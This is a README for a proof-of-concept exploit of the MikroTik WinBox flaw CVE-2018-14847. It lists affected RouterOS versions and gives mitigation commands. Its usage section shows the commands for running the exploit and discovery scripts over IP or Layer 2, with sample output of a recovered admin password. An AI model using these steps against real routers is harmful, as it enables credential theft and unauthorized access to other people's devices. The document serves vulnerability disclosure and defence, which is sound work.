# WinboxExploit
This is a proof of concept of the critical WinBox vulnerability (CVE-2018-14847) which allows for arbitrary file read of plain text passwords.

The vulnerability has long since been fixed, so this project has ended and will not be supported or updated anymore. You can fork it and update it yourself instead.

## Blogpost
https://n0p.me/winbox-bug-dissection/

## Requirements
- Python 3+

This script will NOT run with Python 2.x or lower.

## How To Use
The script is simple used with simple arguments in the commandline.

#### WinBox (TCP/IP)
Exploit the vulnerability and read the password.
```
python3 WinboxExploit.py <IP-ADDRESS> [PORT]
```
Example:
```
$ python3 WinboxExploit.py 172.17.17.17
Connected to 172.17.17.17:8291
Exploit successful
User: admin
Pass: Th3P4ssWord
```

#### MAC server WinBox (Layer 2)  
You can extract files even if the device doesn't have an IP address.

Simple discovery check for locally connected Mikrotik devices.
```
python3 MACServerDiscover.py
```
Example:
```
$ python3 MACServerDiscover.py
Looking for Mikrotik devices (MAC servers)

    aa:bb:cc:dd:ee:ff 

    aa:bb:cc:dd:ee:aa
```

Exploit the vulnerability and read the password.
```
python3 MACServerExploit.py <MAC-ADDRESS>
```
Example:
```
$ python3 MACServerExploit.py aa:bb:cc:dd:ee:ff

User: admin
Pass: Th3P4ssWord
```

## Vulnerable Versions
All RouterOS versions from 2015-05-28 to 2018-04-20 are vulnerable to this exploit.

Mikrotik devices running RouterOS versions:

- Longterm: 6.30.1 - 6.40.7
- Stable: 6.29 - 6.42
- Beta: 6.29rc1 - 6.43rc3

For more information see: https://blog.mikrotik.com/security/winbox-vulnerability.html

## Mitigation Techniques
- Upgrade the router to a RouterOS version that include the fix. 
- Disable the WinBox service on the router.
- You can restricct access to the WinBox service to specific IP-addresses wtih the following:
```
/ip service set winbox address=10.0.0.0/8,172.16.0.0/12,192.168.0.0/16
```
- You may use some Filter Rules (ACL) to deny external access to the WinBox service:
```
/ip firewall filter add chain=input in-interface=wan protocol=tcp dst-port=8291 action=drop
```
- Limiting access to the mac-winbox service can be done by specifing allowed interfaces:
```
/tool mac-server mac-winbox
```

## Copyright
 - Sponsered by Iran's CERTCC(https://certcc.ir). All rights resereved.
